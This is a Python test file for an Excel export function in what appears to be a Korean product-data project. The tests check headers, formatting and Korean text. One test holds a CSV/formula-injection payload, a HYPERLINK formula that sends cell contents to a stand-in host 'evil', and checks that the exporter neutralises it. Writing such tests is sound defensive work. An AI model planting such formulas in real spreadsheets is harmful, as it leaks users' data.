"""scripts/test_export_excel.py"""
import os
from openpyxl import load_workbook
from export_excel import export_to_excel


def test_export_creates_file(tmp_path):
    data = [
        {"상품명": "테스트 상품 A", "가격": 15000, "리뷰수": 42},
        {"상품명": "테스트 상품 B", "가격": 23000, "리뷰수": 17},
    ]
    filepath = str(tmp_path / "test_output.xlsx")
    result = export_to_excel(data, filepath)
    assert os.path.exists(result)


def test_export_correct_content(tmp_path):
    data = [
        {"상품명": "상품A", "가격": 10000},
        {"상품명": "상품B", "가격": 20000},
    ]
    filepath = str(tmp_path / "test.xlsx")
    export_to_excel(data, filepath)
    wb = load_workbook(filepath)
    ws = wb.active
    # Header
    assert ws.cell(1, 1).value == "상품명"
    assert ws.cell(1, 2).value == "가격"
    # Data
    assert ws.cell(2, 1).value == "상품A"
    assert ws.cell(2, 2).value == 10000
    assert ws.cell(3, 1).value == "상품B"
    assert ws.max_row == 3  # header + 2 rows


def test_export_header_bold(tmp_path):
    data = [{"col1": "val"}]
    filepath = str(tmp_path / "test.xlsx")
    export_to_excel(data, filepath)
    wb = load_workbook(filepath)
    ws = wb.active
    assert ws.cell(1, 1).font.bold is True


def test_export_auto_filter(tmp_path):
    data = [{"a": 1, "b": 2}]
    filepath = str(tmp_path / "test.xlsx")
    export_to_excel(data, filepath)
    wb = load_workbook(filepath)
    ws = wb.active
    assert ws.auto_filter.ref is not None


def test_export_empty_data(tmp_path):
    filepath = str(tmp_path / "empty.xlsx")
    result = export_to_excel([], filepath)
    assert result is None  # No file created for empty data


def test_export_korean_encoding(tmp_path):
    data = [{"이름": "홍길동", "주소": "서울시 강남구"}]
    filepath = str(tmp_path / "korean.xlsx")
    export_to_excel(data, filepath)
    wb = load_workbook(filepath)
    ws = wb.active
    assert ws.cell(2, 1).value == "홍길동"


def test_export_neutralizes_formula_injection(tmp_path):
    # CWE-1236: 신뢰할 수 없는 수집 값이 엑셀에서 수식으로 실행되면 안 된다.
    data = [{"제목": '=HYPERLINK("http://evil/?"&A2)', "값": "=1+1", "메모": "@SUM(1,2)"}]
    filepath = str(tmp_path / "inj.xlsx")
    export_to_excel(data, filepath)
    ws = load_workbook(filepath).active
    for col in (1, 2, 3):
        c = ws.cell(2, col)
        assert c.data_type != "f", f"col{col} 이 수식으로 저장됨"
        assert str(c.value).startswith("'"), f"col{col} 이 텍스트로 중화되지 않음"


def test_export_sanitize_opt_out_keeps_raw(tmp_path):
    # 명시적으로 끄면 원본을 보존한다(신뢰 데이터 전용).
    data = [{"값": "=1+1"}]
    filepath = str(tmp_path / "raw.xlsx")
    export_to_excel(data, filepath, sanitize_formulas=False)
    assert load_workbook(filepath).active.cell(2, 1).data_type == "f"


def test_export_normal_values_unaffected(tmp_path):
    # 평범한 문자열·숫자는 중화 영향을 받지 않는다(회귀).
    data = [{"상품명": "상품A", "가격": 10000}]
    filepath = str(tmp_path / "ok.xlsx")
    export_to_excel(data, filepath)
    ws = load_workbook(filepath).active
    assert ws.cell(2, 1).value == "상품A"
    assert ws.cell(2, 2).value == 10000
